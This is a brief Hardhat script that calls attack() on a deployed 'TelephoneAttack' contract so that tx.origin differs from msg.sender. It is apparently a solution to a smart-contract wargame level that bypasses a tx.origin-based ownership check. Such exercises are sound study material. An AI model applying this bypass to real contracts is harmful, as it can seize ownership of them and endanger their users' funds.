import { ethers } from 'hardhat';
// import hre
import hre from 'hardhat';

async function main() {
  const contractAddress = '0xCf99D16A232A9Fa700760Ba74daFD7646DAd4353';
  const contract = await hre.ethers.getContractAt(
    'TelephoneAttack',
    contractAddress
  );

  // Call attack so tx.origin != msg.sender
  const attack = await contract.attack();
  await attack.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
